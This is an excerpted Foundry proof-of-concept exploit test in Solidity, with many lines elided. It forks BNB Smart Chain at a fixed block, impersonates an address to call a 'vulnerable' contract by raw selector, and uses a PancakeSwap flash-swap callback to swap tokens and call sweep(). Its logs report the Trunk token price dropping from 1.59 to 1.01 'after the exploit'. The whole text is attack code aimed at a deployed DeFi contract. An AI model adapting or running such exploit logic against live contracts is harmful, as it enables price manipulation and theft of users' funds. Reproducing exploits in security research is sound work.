...
contract POC is Test {
    ...
    function setUp() public {
        vm.createSelectFork("bsc",40673000);
    ...
    function testFlaw() public {
        ...
        vm.startPrank(0x16E76819aC1f0dfBECc48dFE93B198830e0C85EB);
        bytes memory data = abi.encodeWithSelector(0x671cc612, false);
        (bool success, ) = address(vulnerable).call(data);
        require(success);
        vm.stopPrank();
        ...
        console.log("Trunk price before the exploit: 1.59 >>> ", trunkPrice_before);    
        ...
        console.log("Trunk price after the exploit: 1.01 >>> ", trunkPrice_after); 
    ...
    function pancakeCall(address sender, uint amountOut0, uint amountOut1, bytes calldata data)  external {
        ...
        if (p1 == pool4) {
            ...
            tokenToWbnb(9000000 ether, address(busd));  
            vulnerable.sweep();
